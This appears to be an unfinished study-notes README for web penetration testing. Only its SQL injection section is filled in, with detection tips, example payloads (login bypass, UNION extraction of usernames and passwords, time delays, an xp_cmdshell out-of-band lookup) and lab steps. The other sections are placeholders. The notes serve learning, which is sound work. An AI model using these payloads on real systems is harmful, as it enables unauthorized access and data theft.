# Preliminary
[Github Basic writing and formatting syntax](https://docs.github.com/en/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax)

# Web Penetration Testing Learning path
1. [TryhackMe - Web Fundamentals](https://tryhackme.com/path/outline/web)  
1. [PortSwigger - Web Security Academy](https://portswigger.net/web-security/all-topics)  
1. [iNE - eWPT Web Application Penetration Tester](https://security.ine.com/certifications/ewpt-certification/)

# Table of Contents
**Server-side topics (13)**
- [SQL Injection](#sql-injection)
  - [Lab](#lab)
- [Path Traversal](#path-traversal)
- [Authentication](#authentication)
- [Business Logic Vulnerabilities](#business-logic-vulnerabilities)
- [Command Injection](#command-injection)
- [Information Disclosure](#information-disclosure)
- [Access Control](#access-control)
- [File Upload](#file-upload)
- [Race Condition](#race-condition)
- [SSRF (Server-Side Request Forgery)](#ssrf-server-side-request-forgery)
- [NoSQL Injection](#nosql-injection)
- [XXE Injection](#xxe-injection)
- [API](#api)

**Client-side topics (6)**
- [CSRF (Cross-Site Request Forgery)](#csrf-cross-site-request-forgery)
- [XSS (Cross-Site Scripting)](#xss-cross-site-scripting)
- [CORS (Cross-Origin Resource Sharing)](#cors-cross-origin-resource-sharing)
- [Clickjacking](#clickjacking)
- [DOM-based Attacks](#dom-based-attacks)
- [WebSockets](#websockets)

**Advanced topics (11)**
- [Insecure Deserialization](#insecure-deserialization)
- [Web LLM Attacks](#web-llm-attacks)
- [GraphQL API](#graphql-api)
- [Server-side Template Injection](#server-side-template-injection)
- [Web Cache Poisoning](#web-cache-poisoning)
- [HTTP Host Header](#http-host-header)
- [OAuth Authentication](#oauth-authentication)
- [JWT Attacks](#jwt-attacks)
- [Prototype Pollution](#prototype-pollution)
- [Essential Skills](#essential-skills)
  
## SQL Injection
**How to detect**     
- single quote ' and look for errors or other anomalies
- Boolean condition `OR 1=1` and `OR 1=2`
- time delays

**Basic SQL**  
- `' OR 1=1 --`

**In-band: Error-Based Injection**  
- `'; SELECT 1/0 --`

**In-band: Union-Based Injection**  
- Determine the number of columns required: `' ORDER BY 1--`  OR `' UNION SELECT NULL,NULL--`
- Retrieve othe records: `' UNION SELECT 1, username, password FROM users --`

**Blind: Boolean-based Injection**  
- `'; WAITFOR DELAY '0:0:10' --`
- 
**Blind: Time-Base Injection**  
- `'; WAITFOR DELAY '0:0:10' --`

**Out-of-Band (OOB) Injection**  
- `'; EXEC xp_cmdshell('nslookup yourdomain.com') --`

### Lab
1. SQL injection vulnerability in WHERE clause allowing **retrieval of hidden data**
   - GET /filter?category=`' OR 1=1 --`
   - Verify that the response now contains one or more unreleased products
2. SQL injection vulnerability allowing **login bypass**
   - POST /login
   - modify the body parameter username=`administrator'--`&password=password
5. SQL injection **UNION** attack, determining the **number of columns** returned by the query
   - GET /filter?category=`' UNION SELECT NULL,NULL,NULL--`
7. Item 4
8. Item 5
9. Item 6
10. Item 7
11. Item 8
12. Item 9
13. Item 10
14. Item 11
15. Item 12
16. Item 13
17. Item 14
18. Item 15
19. Item 16
20. Item 17
21. Item 18
22. 



## Path Traversal
Content for Path Traversal...

## Authentication
Content for Authentication...

## Business Logic Vulnerabilities
Content for Business Logic Vulnerabilities...

## Command Injection
Content for Command Injection...

## Information Disclosure
Content for Information Disclosure...

## Access Control
Content for Access Control...

## File Upload
Content for File Upload...

## Race Condition
Content for Race Condition...

## SSRF (Server-Side Request Forgery)
Content for SSRF...

## NoSQL Injection
Content for NoSQL Injection...

## XXE Injection
Content for XXE Injection...

## API
Content for API...

## CSRF (Cross-Site Request Forgery)
Details about CSRF...

## XSS (Cross-Site Scripting)
Details about XSS...

## CORS (Cross-Origin Resource Sharing)
Details about CORS...

## Clickjacking
Details about Clickjacking...

## DOM-based Attacks
Details about DOM-based attacks...

## WebSockets
Details about WebSockets...

## Insecure Deserialization
Content for Insecure Deserialization...

## Web LLM Attacks
Content for Web LLM Attacks...

## GraphQL API
Content for GraphQL API...

## Server-side Template Injection
Content for Server-side Template Injection...

## Web Cache Poisoning
Content for Web Cache Poisoning...

## HTTP Host Header
Content for HTTP Host Header...

## OAuth Authentication
Content for OAuth Authentication...

## JWT Attacks
Content for JWT Attacks...

## Prototype Pollution
Content for Prototype Pollution...

## Essential Skills
Content for Essential Skills...
